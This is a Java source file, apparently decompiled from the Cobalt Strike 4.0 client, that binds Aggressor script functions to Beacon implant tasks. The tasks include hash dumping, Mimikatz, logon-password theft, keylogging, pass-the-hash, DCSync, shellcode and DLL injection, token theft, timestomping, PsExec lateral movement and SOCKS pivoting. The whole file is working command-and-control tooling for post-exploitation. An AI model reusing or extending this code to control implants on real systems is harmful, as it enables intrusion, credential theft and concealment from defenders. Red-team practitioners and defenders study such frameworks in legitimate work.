package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.Registry;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.ListenerUtils;
import common.ScListener;
import cortana.Cortana;

import java.util.LinkedList;
import java.util.Stack;

import sleep.bridges.BridgeUtilities;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

public class BeaconTaskBridge implements Function, Loadable {
    protected AggressorClient client;

    public BeaconTaskBridge(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void scriptLoaded(ScriptInstance scriptInstance) {
        LinkedList<String> linkedList = new LinkedList();
        linkedList.add("&binput");
        linkedList.add("&berror");
        linkedList.add("&btask");
        linkedList.add("&blog");
        linkedList.add("&blog2");
        linkedList.add("&beacon_link");
        linkedList.add("&bargue_add");
        linkedList.add("&bargue_list");
        linkedList.add("&bargue_remove");
        linkedList.add("&bblockdlls");
        linkedList.add("&bbrowserpivot");
        linkedList.add("&bbrowserpivot_stop");
        linkedList.add("&bbypassuac");
        linkedList.add("&bcancel");
        linkedList.add("&bcd");
        linkedList.add("&bcheckin");
        linkedList.add("&bclear");
        linkedList.add("&bconnect");
        linkedList.add("&bcovertvpn");
        linkedList.add("&bcp");
        linkedList.add("&bdcsync");
        linkedList.add("&bdesktop");
        linkedList.add("&bdllinject");
        linkedList.add("&bdllload");
        linkedList.add("&bdllspawn");
        linkedList.add("&bdownload");
        linkedList.add("&bdrives");
        linkedList.add("&belevate");
        linkedList.add("&belevate_command");
        linkedList.add("&bexecute");
        linkedList.add("&bexecute_assembly");
        linkedList.add("&bexit");
        linkedList.add("&bgetprivs");
        linkedList.add("&bgetsystem");
        linkedList.add("&bgetuid");
        linkedList.add("&bhashdump");
        linkedList.add("&binject");
        linkedList.add("&bjobkill");
        linkedList.add("&bjobs");
        linkedList.add("&bjump");
        linkedList.add("&bkerberos_ccache_use");
        linkedList.add("&bkerberos_ticket_purge");
        linkedList.add("&bkerberos_ticket_use");
        linkedList.add("&bkeylogger");
        linkedList.add("&bkill");
        linkedList.add("&blink");
        linkedList.add("&bloginuser");
        linkedList.add("&blogonpasswords");
        linkedList.add("&bmkdir");
        linkedList.add("&bmimikatz");
        linkedList.add("&bmode");
        linkedList.add("&bmv");
        linkedList.add("&bnetview");
        linkedList.add("&bnet");
        linkedList.add("&bnote");
        linkedList.add("&bpassthehash");
        linkedList.add("&bpause");
        linkedList.add("&bportscan");
        linkedList.add("&bpowerpick");
        linkedList.add("&bpowershell");
        linkedList.add("&bpowershell_import");
        linkedList.add("&bpowershell_import_clear");
        linkedList.add("&bppid");
        linkedList.add("&bpsexec");
        linkedList.add("&bpsexec_command");
        linkedList.add("&bpsexec_psh");
        linkedList.add("&bpsinject");
        linkedList.add("&bpwd");
        linkedList.add("&breg_query");
        linkedList.add("&breg_queryv");
        linkedList.add("&bremote_exec");
        linkedList.add("&brev2self");
        linkedList.add("&brportfwd");
        linkedList.add("&btcppivot");
        linkedList.add("&brportfwd_stop");
        linkedList.add("&brm");
        linkedList.add("&brun");
        linkedList.add("&brunas");
        linkedList.add("&brunasadmin");
        linkedList.add("&brunu");
        linkedList.add("&bsetenv");
        linkedList.add("&bscreenshot");
        linkedList.add("&bshell");
        linkedList.add("&bshinject");
        linkedList.add("&bshspawn");
        linkedList.add("&bsleep");
        linkedList.add("&bsocks");
        linkedList.add("&bsocks_stop");
        linkedList.add("&bspawn");
        linkedList.add("&bspawnas");
        linkedList.add("&bspawnto");
        linkedList.add("&bspawnu");
        linkedList.add("&bssh");
        linkedList.add("&bssh_key");
        linkedList.add("&bstage");
        linkedList.add("&bsteal_token");
        linkedList.add("&bsudo");
        linkedList.add("&btimestomp");
        linkedList.add("&bunlink");
        linkedList.add("&bupload");
        linkedList.add("&bupload_raw");
        linkedList.add("&bwdigest");
        linkedList.add("&bwinrm");
        linkedList.add("&bwmi");
        for (String str : linkedList) {
            Cortana.put(scriptInstance, str, this);
            Cortana.put(scriptInstance, str + "!", this);
        }
    }

    public void scriptUnloaded(ScriptInstance scriptInstance) {
    }

    public static String[] bids(Stack stack) {
        return BeaconBridge.bids(stack);
    }

    public Scalar evaluate(String string, ScriptInstance scriptInstance, Stack stack) {
        String[] arrstring = bids(stack);
        TaskBeacon taskBeacon = new TaskBeacon(this.client, arrstring);
        if (string.endsWith("!")) {
            string = CommonUtils.stripRight(string, "!");
            taskBeacon.silent();
        }
        if (string.equals("&bargue_add")) {
            String str1 = BridgeUtilities.getString(stack, "");
            String str2 = BridgeUtilities.getString(stack, "");
            taskBeacon.SpoofArgsAdd(str1, str2);
        } else if (string.equals("&bargue_list")) {
            taskBeacon.SpoofArgsList();
        } else if (string.equals("&bargue_remove")) {
            String str = BridgeUtilities.getString(stack, "");
            taskBeacon.SpoofArgsRemove(str);
        } else if (string.equals("&bblockdlls")) {
            Scalar scalar = BridgeUtilities.getScalar(stack);
            taskBeacon.BlockDLLs(SleepUtils.isTrueScalar(scalar));
        } else if (string.equals("&bbrowserpivot")) {
            int i = BridgeUtilities.getInt(stack, 0);
            String str = BridgeUtilities.getString(stack, "x86");
            taskBeacon.BrowserPivot(i, str);
        } else if (string.equals("&bbrowserpivot_stop")) {
            taskBeacon.BrowserPivotStop();
        } else {
            if (string.equals("&bbypassuac"))
                throw new RuntimeException("Removed in Cobalt Strike 4.0");
            if (string.equals("&bcancel")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.Cancel(str);
            } else if (string.equals("&bclear")) {
                taskBeacon.Clear();
            } else if (string.equals("&bcd")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.Cd(str);
            } else if (string.equals("&bcheckin")) {
                taskBeacon.Checkin();
            } else if (string.equals("&bcovertvpn")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                if (stack.isEmpty()) {
                    for (byte b = 0; b < arrstring.length; b++)
                        taskBeacon.CovertVPN(arrstring[b], str1, str2, null);
                } else {
                    String str = BridgeUtilities.getString(stack, "");
                    for (byte b = 0; b < arrstring.length; b++)
                        taskBeacon.CovertVPN(arrstring[b], str1, str2, str);
                }
            } else if (string.equals("&bcp")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                taskBeacon.Copy(str1, str2);
            } else if (string.equals("&bdcsync")) {
                String str = BridgeUtilities.getString(stack, "");
                if (stack.isEmpty()) {
                    taskBeacon.DcSync(str);
                } else {
                    String str1 = BridgeUtilities.getString(stack, "");
                    taskBeacon.DcSync(str, str1);
                }
            } else if (string.equals("&bdesktop")) {
                taskBeacon.Desktop(true);
            } else if (string.equals("&bdllinject")) {
                int i = BridgeUtilities.getInt(stack, 0);
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.DllInject(i, str);
            } else if (string.equals("&bdllload")) {
                int i = BridgeUtilities.getInt(stack, 0);
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.DllLoad(i, str);
            } else if (string.equals("&bdllspawn")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, null);
                String str3 = BridgeUtilities.getString(stack, null);
                int i = BridgeUtilities.getInt(stack, 0);
                boolean bool = SleepUtils.isTrueScalar(BridgeUtilities.getScalar(stack));
                taskBeacon.DllSpawn(str1, str2, str3, i, bool);
            } else if (string.equals("&bdownload")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.Download(str);
            } else if (string.equals("&bdrives")) {
                taskBeacon.Drives();
            } else if (string.equals("&belevate")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                taskBeacon.Elevate(str1, str2);
            } else if (string.equals("&belevate_command")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                taskBeacon.ElevateCommand(str1, str2);
            } else if (string.equals("&berror")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.error(str);
            } else if (string.equals("&bexecute")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.Execute(str);
            } else if (string.equals("&bexecute_assembly")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                taskBeacon.ExecuteAssembly(str1, str2);
            } else if (string.equals("&bexit")) {
                taskBeacon.Die();
            } else if (string.equals("&bgetuid")) {
                taskBeacon.GetUID();
            } else if (string.equals("&bhashdump")) {
                taskBeacon.Hashdump();
            } else if (string.equals("&binject")) {
                int i = BridgeUtilities.getInt(stack, 0);
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "x86");
                taskBeacon.Inject(i, str1, str2);
            } else if (string.equals("&binput")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.input(str);
            } else if (string.equals("&bgetprivs")) {
                if (stack.isEmpty()) {
                    taskBeacon.GetPrivs();
                } else {
                    String str = BridgeUtilities.getString(stack, "");
                    taskBeacon.GetPrivs(str);
                }
            } else if (string.equals("&bgetsystem")) {
                taskBeacon.GetSystem();
            } else if (string.equals("&bjobkill")) {
                int i = BridgeUtilities.getInt(stack, 0);
                taskBeacon.JobKill(i);
            } else if (string.equals("&bjobs")) {
                taskBeacon.Jobs();
            } else if (string.equals("&bjump")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                String str3 = BridgeUtilities.getString(stack, "");
                taskBeacon.Jump(str1, str2, str3);
            } else if (string.equals("&bkerberos_ticket_purge")) {
                taskBeacon.KerberosTicketPurge();
            } else if (string.equals("&bkerberos_ticket_use")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.KerberosTicketUse(str);
            } else if (string.equals("&bkerberos_ccache_use")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.KerberosCCacheUse(str);
            } else if (string.equals("&bkeylogger")) {
                if (stack.isEmpty()) {
                    taskBeacon.KeyLogger();
                } else {
                    int i = BridgeUtilities.getInt(stack, 0);
                    String str = BridgeUtilities.getString(stack, "x86");
                    taskBeacon.KeyLogger(i, str);
                }
            } else if (string.equals("&bkill")) {
                int i = BridgeUtilities.getInt(stack, 0);
                taskBeacon.Kill(i);
            } else if (string.equals("&blink")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = "";
                if (!stack.isEmpty()) {
                    str2 = BridgeUtilities.getString(stack, "");
                    taskBeacon.Link("\\\\" + str1 + "\\pipe\\" + str2);
                } else {
                    taskBeacon.Link(DataUtils.getDefaultPipeName(this.client.getData(), str1));
                }
            } else if (string.equals("&bconnect")) {
                String str = BridgeUtilities.getString(stack, "");
                if (!stack.isEmpty()) {
                    int i = BridgeUtilities.getInt(stack, 0);
                    taskBeacon.Connect(str, i);
                } else {
                    taskBeacon.Connect(str);
                }
            } else if (string.equals("&blog")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.log(str);
            } else if (string.equals("&blog2")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.log2(str);
            } else if (string.equals("&bloginuser")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                String str3 = BridgeUtilities.getString(stack, "");
                taskBeacon.LoginUser(str1, str2, str3);
            } else if (string.equals("&blogonpasswords")) {
                taskBeacon.LogonPasswords();
            } else if (string.equals("&bmimikatz")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.Mimikatz(str);
            } else if (string.equals("&bmkdir")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.MkDir(str);
            } else if (string.equals("&bmode")) {
                String str = BridgeUtilities.getString(stack, "");
                if ("dns".equals(str)) {
                    taskBeacon.ModeDNS();
                } else if ("dns6".equals(str)) {
                    taskBeacon.ModeDNS6();
                } else if ("dns-txt".equals(str)) {
                    taskBeacon.ModeDNS_TXT();
                } else if ("http".equals(str)) {
                    taskBeacon.ModeHTTP();
                } else {
                    throw new RuntimeException("Invalid mode: '" + str + "'");
                }
            } else if (string.equals("&bmv")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                taskBeacon.Move(str1, str2);
            } else if (string.equals("&bnet")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, null);
                String str3 = BridgeUtilities.getString(stack, null);
                taskBeacon.NetView(str1, str2, str3);
            } else if (string.equals("&bnetview")) {
                if (!stack.isEmpty()) {
                    String str = BridgeUtilities.getString(stack, "");
                    taskBeacon.NetView("view", str, null);
                } else {
                    taskBeacon.NetView("view", null, null);
                }
            } else if (string.equals("&bnote")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.Note(str);
            } else if (string.equals("&bpassthehash")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                String str3 = BridgeUtilities.getString(stack, "");
                taskBeacon.PassTheHash(str1, str2, str3);
            } else if (string.equals("&bpause")) {
                int i = BridgeUtilities.getInt(stack, 0);
                taskBeacon.Pause(i);
            } else if (string.equals("&bportscan")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "1-1024");
                String str3 = BridgeUtilities.getString(stack, "arp");
                int i = BridgeUtilities.getInt(stack, 1024);
                taskBeacon.PortScan(str1, str2, str3, i);
            } else if (string.equals("&bpowerpick")) {
                String str = BridgeUtilities.getString(stack, "");
                if (stack.isEmpty()) {
                    taskBeacon.PowerShellUnmanaged(str);
                } else {
                    String str1 = BridgeUtilities.getString(stack, "");
                    if ("".equals(str1)) {
                        taskBeacon.PowerShellUnmanaged(str, "");
                    } else {
                        taskBeacon.PowerShellUnmanaged(str, str1 + "; ");
                    }
                }
            } else if (string.equals("&bpowershell")) {
                String str = BridgeUtilities.getString(stack, "");
                if (stack.isEmpty()) {
                    taskBeacon.PowerShell(str);
                } else {
                    String str1 = BridgeUtilities.getString(stack, "");
                    if ("".equals(str1)) {
                        taskBeacon.PowerShellWithCradle(str, "");
                    } else {
                        taskBeacon.PowerShellWithCradle(str, str1 + "; ");
                    }
                }
            } else if (string.equals("&bpowershell_import")) {
                String str = BridgeUtilities.getString(stack, "");
                taskBeacon.PowerShellImport(str);
            } else if (string.equals("&bpowershell_import_clear")) {
                taskBeacon.PowerShellImportClear();
            } else if (string.equals("&bppid")) {
                int i = BridgeUtilities.getInt(stack, 0);
                taskBeacon.PPID(i);
            } else if (string.equals("&bpsexec")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                String str3 = BridgeUtilities.getString(stack, "ADMIN$");
                String str4 = BridgeUtilities.getString(stack, "x86");
                taskBeacon.PsExec(str1, str2, str3, str4);
            } else if (string.equals("&bpsexec_command")) {
                String str1 = BridgeUtilities.getString(stack, "");
                String str2 = BridgeUtilities.getString(stack, "");
                String str3 = BridgeUtilities.getString(stack, "");
                taskBeacon.PsExecCommand(str1, str2, str3);
            } else {
                if (string.equals("&bpsexec_psh"))
                    throw new RuntimeException("Removed in Cobalt Strike 4.0");
                if (string.equals("&bpsinject")) {
                    int i = BridgeUtilities.getInt(stack, 0);
                    String str1 = BridgeUtilities.getString(stack, "x86");
                    String str2 = BridgeUtilities.getString(stack, "");
                    taskBeacon.PsInject(i, str1, str2);
                } else if (string.equals("&bpwd")) {
                    taskBeacon.Pwd();
                } else if (string.equals("&breg_query")) {
                    String str1 = BridgeUtilities.getString(stack, "");
                    String str2 = BridgeUtilities.getString(stack, "x86");
                    taskBeacon.RegQuery(new Registry(str2, str1, false));
                } else if (string.equals("&breg_queryv")) {
                    String str1 = BridgeUtilities.getString(stack, "");
                    String str2 = BridgeUtilities.getString(stack, "");
                    String str3 = BridgeUtilities.getString(stack, "x86");
                    taskBeacon.RegQueryValue(new Registry(str3, str1 + " " + str2, true));
                } else if (string.equals("&bremote_exec")) {
                    String str1 = BridgeUtilities.getString(stack, "");
                    String str2 = BridgeUtilities.getString(stack, "");
                    String str3 = BridgeUtilities.getString(stack, "");
                    taskBeacon.RemoteExecute(str1, str2, str3);
                } else if (string.equals("&brev2self")) {
                    taskBeacon.Rev2Self();
                } else if (string.equals("&brm")) {
                    String str = BridgeUtilities.getString(stack, "");
                    if ("".equals(str))
                        throw new IllegalArgumentException("argument is empty (you don't want this)");
                    taskBeacon.Rm(str);
                } else if (string.equals("&btcppivot")) {
                    int i = BridgeUtilities.getInt(stack, 0);
                    taskBeacon.PivotListenerTCP(i);
                } else if (string.equals("&brportfwd")) {
                    int i = BridgeUtilities.getInt(stack, 0);
                    String str = BridgeUtilities.getString(stack, "");
                    int j = BridgeUtilities.getInt(stack, 0);
                    taskBeacon.PortForward(i, str, j);
                } else if (string.equals("&brportfwd_stop")) {
                    int i = BridgeUtilities.getInt(stack, 0);
                    taskBeacon.PortForwardStop(i);
                } else if (string.equals("&brun")) {
                    String str = BridgeUtilities.getString(stack, "");
                    taskBeacon.Run(str);
                } else if (string.equals("&brunas")) {
                    String str1 = BridgeUtilities.getString(stack, "");
                    String str2 = BridgeUtilities.getString(stack, "");
                    String str3 = BridgeUtilities.getString(stack, "");
                    String str4 = BridgeUtilities.getString(stack, "");
                    taskBeacon.RunAs(str1, str2, str3, str4);
                } else {
                    if (string.equals("&brunasadmin"))
                        throw new RuntimeException("Removed in Cobalt Strike 4.0");
                    if (string.equals("&brunu")) {
                        int i = BridgeUtilities.getInt(stack, 0);
                        String str = BridgeUtilities.getString(stack, "");
                        taskBeacon.RunUnder(i, str);
                    } else if (string.equals("&bscreenshot")) {
                        int i = BridgeUtilities.getInt(stack, 0);
                        taskBeacon.Screenshot(i);
                    } else if (string.equals("&bsetenv")) {
                        String str = BridgeUtilities.getString(stack, "");
                        if (!stack.isEmpty()) {
                            String str1 = BridgeUtilities.getString(stack, "");
                            taskBeacon.SetEnv(str, str1);
                        } else {
                            taskBeacon.SetEnv(str, null);
                        }
                    } else if (string.equals("&bshell")) {
                        String str = BridgeUtilities.getString(stack, "");
                        taskBeacon.Shell(str);
                    } else if (string.equals("&bshinject")) {
                        int i = BridgeUtilities.getInt(stack, 0);
                        String str1 = BridgeUtilities.getString(stack, "x86");
                        String str2 = BridgeUtilities.getString(stack, "");
                        taskBeacon.ShellcodeInject(i, str1, str2);
                    } else if (string.equals("&bshspawn")) {
                        String str1 = BridgeUtilities.getString(stack, "x86");
                        String str2 = BridgeUtilities.getString(stack, "");
                        taskBeacon.ShellcodeSpawn(str1, str2);
                    } else if (string.equals("&bsleep")) {
                        int i = BridgeUtilities.getInt(stack, 0);
                        int j = BridgeUtilities.getInt(stack, 0);
                        taskBeacon.Sleep(i, j);
                    } else if (string.equals("&bsocks")) {
                        int i = BridgeUtilities.getInt(stack, 0);
                        taskBeacon.SocksStart(i);
                    } else if (string.equals("&bsocks_stop")) {
                        taskBeacon.SocksStop();
                    } else if (string.equals("&bspawn")) {
                        String str = BridgeUtilities.getString(stack, "");
                        if (stack.isEmpty()) {
                            taskBeacon.Spawn(str);
                        } else {
                            String str1 = BridgeUtilities.getString(stack, "x86");
                            taskBeacon.Spawn(str, str1);
                        }
                    } else if (string.equals("&bspawnas")) {
                        String str1 = BridgeUtilities.getString(stack, "");
                        String str2 = BridgeUtilities.getString(stack, "");
                        String str3 = BridgeUtilities.getString(stack, "");
                        String str4 = BridgeUtilities.getString(stack, "");
                        taskBeacon.SpawnAs(str1, str2, str3, str4);
                    } else if (string.equals("&bspawnto")) {
                        if (stack.isEmpty()) {
                            taskBeacon.SpawnTo();
                        } else {
                            String str1 = BridgeUtilities.getString(stack, "x86");
                            String str2 = BridgeUtilities.getString(stack, "");
                            taskBeacon.SpawnTo(str1, str2);
                        }
                    } else if (string.equals("&bspawnu")) {
                        int i = BridgeUtilities.getInt(stack, 0);
                        String str = BridgeUtilities.getString(stack, "");
                        taskBeacon.SpawnUnder(i, str);
                    } else if (string.equals("&bssh")) {
                        String str1 = BridgeUtilities.getString(stack, "");
                        int i = BridgeUtilities.getInt(stack, 22);
                        String str2 = BridgeUtilities.getString(stack, "");
                        String str3 = BridgeUtilities.getString(stack, "");
                        taskBeacon.SecureShell(str2, str3, str1, i);
                    } else if (string.equals("&bssh_key")) {
                        String str1 = BridgeUtilities.getString(stack, "");
                        int i = BridgeUtilities.getInt(stack, 22);
                        String str2 = BridgeUtilities.getString(stack, "");
                        String str3 = BridgeUtilities.getString(stack, "");
                        taskBeacon.SecureShellPubKey(str2, CommonUtils.toBytes(str3), str1, i);
                    } else {
                        if (string.equals("&bstage")) {
                            String str1 = BridgeUtilities.getString(stack, "");
                            String str2 = BridgeUtilities.getString(stack, "");
                            String str3 = BridgeUtilities.getString(stack, "x86");
                            if ("".equals(str1)) ;
                            throw new RuntimeException("This function is deprecated in Cobalt Strike 4.0");
                        }
                        if (string.equals("&bsteal_token")) {
                            int i = BridgeUtilities.getInt(stack, 0);
                            taskBeacon.StealToken(i);
                        } else if (string.equals("&bsudo")) {
                            String str1 = BridgeUtilities.getString(stack, "");
                            String str2 = BridgeUtilities.getString(stack, "");
                            taskBeacon.ShellSudo(str1, str2);
                        } else if (string.equals("&btask")) {
                            String str1 = BridgeUtilities.getString(stack, "");
                            String str2 = BridgeUtilities.getString(stack, "");
                            taskBeacon.task(str1, str2);
                        } else if (string.equals("&btimestomp")) {
                            String str1 = BridgeUtilities.getString(stack, "");
                            String str2 = BridgeUtilities.getString(stack, "");
                            taskBeacon.TimeStomp(str1, str2);
                        } else if (string.equals("&bunlink")) {
                            String str = BridgeUtilities.getString(stack, "");
                            if (stack.isEmpty()) {
                                taskBeacon.Unlink(str);
                            } else {
                                String str1 = BridgeUtilities.getString(stack, "");
                                taskBeacon.Unlink(str, str1);
                            }
                        } else if (string.equals("&bupload")) {
                            String str = BridgeUtilities.getString(stack, "");
                            taskBeacon.Upload(str);
                        } else if (string.equals("&bupload_raw")) {
                            String str1 = BridgeUtilities.getString(stack, "");
                            String str2 = BridgeUtilities.getString(stack, "");
                            String str3 = BridgeUtilities.getString(stack, str1);
                            taskBeacon.UploadRaw(str3, str1, CommonUtils.toBytes(str2));
                        } else {
                            if (string.equals("&bwdigest"))
                                throw new RuntimeException("Removed in Cobalt Strike 4.0");
                            if (string.equals("&bwinrm"))
                                throw new RuntimeException("Removed in Cobalt Strike 4.0");
                            if (string.equals("&bwmi"))
                                throw new RuntimeException("Removed in Cobalt Strike 4.0");
                            if (string.equals("&beacon_link")) {
                                String str1 = BridgeUtilities.getString(stack, ".");
                                String str2 = BridgeUtilities.getString(stack, "");
                                ScListener scListener = ListenerUtils.getListener(this.client, str2);
                                if (str1 == null || "".equals(str1))
                                    str1 = ".";
                                taskBeacon.linkToPayloadRemote(scListener, str1);
                            }
                        }
                    }
                }
            }
        }
        return SleepUtils.getEmptyScalar();
    }
}
